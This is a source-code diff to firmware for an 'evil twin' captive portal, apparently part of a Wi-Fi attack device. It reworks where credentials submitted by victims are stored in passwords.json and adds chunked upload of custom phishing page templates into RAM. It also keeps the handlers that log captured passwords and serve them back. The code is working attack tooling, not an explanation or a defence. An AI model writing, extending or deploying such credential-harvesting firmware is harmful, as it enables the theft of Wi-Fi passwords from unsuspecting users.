@@ -30,14 +30,23 @@
 
 static const char *TAG = "EVIL_TWIN_BACKEND";
 
-#define PATH_HTML_INDEX "html/captive_portal/evil_twin_index.html"
-#define PATH_HTML_THANKS "html/captive_portal/evil_twin_thank_you.html"
-#define PATH_PASSWORDS_JSON "storage/captive_portal/passwords.json"
+#include "tos_flash_paths.h"
+#define PATH_HTML_INDEX FLASH_CAPTIVE_HTML_INDEX
+#define PATH_HTML_THANKS FLASH_CAPTIVE_HTML_THANKS
+// Relative path for storage_assets_load_file, absolute for write
+#define PATH_PASSWORDS_REL "storage/captive_portal/passwords.json"
+#define PATH_PASSWORDS_ABS FLASH_STORAGE_CAPTIVE_PASS
 
 static SemaphoreHandle_t storage_mutex = NULL;
 static const char *current_template_path = PATH_HTML_INDEX;
 static bool has_password = false;
 static char last_password[64];
+
+// RAM buffer for template uploaded from P4
+#define TMPL_BUF_MAX (8 * 1024)
+static char *uploaded_template = NULL;
+static size_t uploaded_template_size = 0;
+static size_t uploaded_template_offset = 0;
 
 static void init_storage_mutex();
 
@@ -58,7 +67,7 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
       cJSON *root_array = NULL;
       
       size_t size = 0;
-      char *existing_json = (char*)storage_assets_load_file(PATH_PASSWORDS_JSON, &size);
+      char *existing_json = (char*)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
 
       if (existing_json) {
         root_array = cJSON_Parse(existing_json);
@@ -78,10 +87,7 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
 
       char *output = cJSON_PrintUnformatted(root_array);
       if (output) {
-        // Write to absolute path
-        char write_path[128];
-        snprintf(write_path, sizeof(write_path), "/assets/%s", PATH_PASSWORDS_JSON);
-        storage_write_string(write_path, output);
+        storage_write_string(PATH_PASSWORDS_ABS, output);
         free(output);
       }
       cJSON_Delete(root_array);
@@ -117,7 +123,7 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
 
   if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(2000)) == pdTRUE) {
     size_t size = 0;
-    char *json_data = (char*)storage_assets_load_file(PATH_PASSWORDS_JSON, &size);
+    char *json_data = (char*)storage_assets_load_file(PATH_PASSWORDS_REL, &size);
     xSemaphoreGive(storage_mutex);
 
     if (json_data) {
@@ -133,6 +139,13 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
 }
 
 static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
+  // Serve from uploaded RAM buffer if available
+  if (uploaded_template && uploaded_template_offset >= uploaded_template_size) {
+    http_service_send_response(req, uploaded_template, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+  }
+
+  // Fallback to flash asset
   size_t size = 0;
   const char *path = current_template_path ? current_template_path : PATH_HTML_INDEX;
   char *html = (char*)storage_assets_load_file(path, &size);
@@ -161,6 +174,37 @@ static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
 //
 //     return ESP_OK;
 // }
+
+void evil_twin_tmpl_begin(uint16_t total_size) {
+  if (uploaded_template) {
+    free(uploaded_template);
+    uploaded_template = NULL;
+  }
+  if (total_size == 0 || total_size > TMPL_BUF_MAX) {
+    ESP_LOGE(TAG, "Template size invalid: %u", total_size);
+    return;
+  }
+  uploaded_template = malloc(total_size + 1);
+  if (!uploaded_template) {
+    ESP_LOGE(TAG, "Failed to allocate template buffer");
+    return;
+  }
+  uploaded_template_size = total_size;
+  uploaded_template_offset = 0;
+  ESP_LOGI(TAG, "Template upload started: %u bytes", total_size);
+}
+
+void evil_twin_tmpl_chunk(const uint8_t *data, uint8_t len) {
+  if (!uploaded_template || !data || len == 0) return;
+  size_t remaining = uploaded_template_size - uploaded_template_offset;
+  size_t to_copy = (len > remaining) ? remaining : len;
+  memcpy(uploaded_template + uploaded_template_offset, data, to_copy);
+  uploaded_template_offset += to_copy;
+  if (uploaded_template_offset >= uploaded_template_size) {
+    uploaded_template[uploaded_template_size] = '\0';
+    ESP_LOGI(TAG, "Template upload complete: %u bytes", (unsigned)uploaded_template_size);
+  }
+}
 
 static void register_evil_twin_handlers(void) {
   start_web_server();
